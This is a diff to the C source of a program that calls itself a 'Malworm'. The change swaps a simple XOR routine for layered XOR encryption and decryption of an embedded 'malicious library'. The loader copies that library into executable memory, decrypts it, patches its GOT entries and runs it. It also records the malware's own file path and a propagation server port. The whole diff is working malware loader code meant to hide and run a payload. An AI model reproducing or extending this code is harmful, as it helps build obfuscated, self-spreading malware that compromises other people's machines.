@@ -21,8 +21,10 @@
 #include "main/globals.h"
 
 
-void xor_memory(void * memory, size_t len, char*key);
-
+// xor a memory region with the given key and layer (layered xor-encryption logic)
+void xor_memory_layered(void * memory, size_t len, char*key, int layer);
+void encrypt_layered(void *memory, size_t len, char* key);
+void decrypt_layered(void *memory, size_t len, char* key);
 
 // Function pointer type for the embedded function
 typedef void (*MaLibEntry)(Globals *);
@@ -106,7 +108,9 @@ void init_globals(Globals *global){
     global->rand = &rand;
 
     // custom functions
-    global->xor_memory = &xor_memory;
+    global->xor_memory_layered=&xor_memory_layered;
+    global->encrypt_layered=&encrypt_layered;
+    global->decrypt_layered=&decrypt_layered;
 
     // global values
     global->propagation_server_port = 42024;
@@ -118,17 +122,6 @@ void exec_malib(Globals *global, void*mem, uint64_t entry_offset, size_t mem_siz
     MaLibEntry lib_entry = (MaLibEntry)mem + entry_offset;
     lib_entry(global);
     munmap(mem, mem_size);
-}
-
-// xor a memory region with the given key
-void xor_memory(void * memory, size_t len, char*key){
-    unsigned char* tmp = (unsigned char*) memory;
-    size_t keylen = 8*sizeof(char);
-    for(int i=0;i<len;i++){
-        char k = (char)key[i%keylen];
-        //fprintf(stdout, "decrypt with char 0x%#02x\n", k);
-        tmp[i] ^= key[i % keylen];
-    }
 }
 
 /// load a malicious library into memory and decrypt it
@@ -143,14 +136,12 @@ void * load_library(MaLib *lib){
 
     // Copy the byte array to the executable memory
     memcpy(lib_mem, lib->data, lib->data_length);
-    xor_memory(lib_mem, lib->data_length, (char *)&lib->key);
+    //xor_memory(lib_mem, lib->data_length, (char *)&lib->key);
+    decrypt_layered(lib_mem, lib->data_length, (char *)&lib->key);
 
-    // link got
-    //fprintf(stdout, "lib_mem at %p\n", lib_mem);
-    //fprintf(stdout, "Number of got_offsets: %d\n", lib->n_got_mappings);
+    // linking GOT
     for(size_t i = 0; i < lib->n_got_mappings; i++){
-        //fprintf(stdout, "Update GOT entry at %p from %lx to %lx\n", lib_mem+lib->got_offsets[i], *(uint64_t *)(lib_mem+lib->got_offsets[i]), (uint64_t) lib_mem + lib->got_targets[i]);
-        *(uint64_t *)(lib_mem+lib->got_offsets[i]) = (uint64_t) lib_mem + lib->got_targets[i];
+        *(uint64_t *)(lib_mem + lib->got_offsets[i]) = (uint64_t) lib_mem + lib->got_targets[i];
     }
 
     return lib_mem;
@@ -163,7 +154,7 @@ void load_libraries(Globals *global){
     // TODO: error handling
     setup_library(&lib);
 
-    fprintf(stdout, "🔑🔒🔑🔒🔑    0x%lx     🔑🔒🔑🔒🔑\n", lib->key);
+    DEBUG_LOG("🔑🔒🔑🔒🔑    0x%lx     🔑🔒🔑🔒🔑\n", lib->key);
 
     // load the library
     void* lib_mem = load_library(lib);
@@ -171,13 +162,53 @@ void load_libraries(Globals *global){
     global->lib = lib;
     
     // run the library code (entry)
-    fprintf(stdout, "🦠🪱🐛🪱🐉 Malworm ready to eat you! 🐉🪱🐛🪱🦠\n");
+    DEBUG_LOG("🦠🪱🐛🪱🐉 Malworm ready to eat you! 🐉🪱🐛🪱🦠\n");
     exec_malib(global, lib_mem, lib->entry_offset, lib->data_length);
 
     // free the library
     free(lib);
 }
 
+// Get filepath of executable itself
+char* load_filepath(Globals *global, char*filename){
+    global->malware_path = global->malloc(MAX_PATH_LEN);
+    ASSERT(global->malware_path, "malloc");
+    if(filename[0] == '/'){
+        global->malware_path = filename;
+        return global->malware_path;
+    }
+    char*cwd = global->getcwd(NULL, MAX_PATH_LEN - global->strlen(filename));
+    ASSERT(cwd, "getcwd");
+    global->snprintf(global->malware_path, MAX_PATH_LEN-1, "%s/%s", cwd, filename);
+    global->free(cwd);
+    global->realpath(filename, global->malware_path);
+
+    return global->malware_path;
+}
+// xor a memory region with the given key and layer (layered xor-encryption logic)
+void xor_memory_layered(void * memory, size_t len, char*key, int layer){
+    unsigned char* tmp = (unsigned char*) memory;
+    size_t keylen = KEYLEN*sizeof(char);
+    int ik = 0;
+    for(int i=layer; i<len; i+=layer+1){
+        char k = (char)key[ik%keylen];
+        tmp[i] ^= k;
+        ik+=layer+1;
+    }
+}
+void encrypt_layered(void *memory, size_t len, char* key){
+    size_t keylen = KEYLEN*sizeof(char);
+    for(int i=0; i<keylen; i++){
+        xor_memory_layered(memory, len, key, i);
+    }
+}
+
+void decrypt_layered(void *memory, size_t len, char* key){
+    size_t keylen = KEYLEN*sizeof(char);
+    for(int i=keylen-1; i>=0; i--){
+        xor_memory_layered(memory, len, key, i);
+    }
+}
 
 int main(int argc, char**argv) {
     // setup global variables and functions
@@ -185,8 +216,8 @@ int main(int argc, char**argv) {
     srand(time(NULL));
     init_globals(global);
 
-    // add a reference to the executable of the malworm to the struct globals
-    global->exec_path = argv[0];
+    // load the filepath of the executing binary
+    load_filepath(global, argv[0]);
 
     // load and execute all provided malware-libraries
     load_libraries(global);
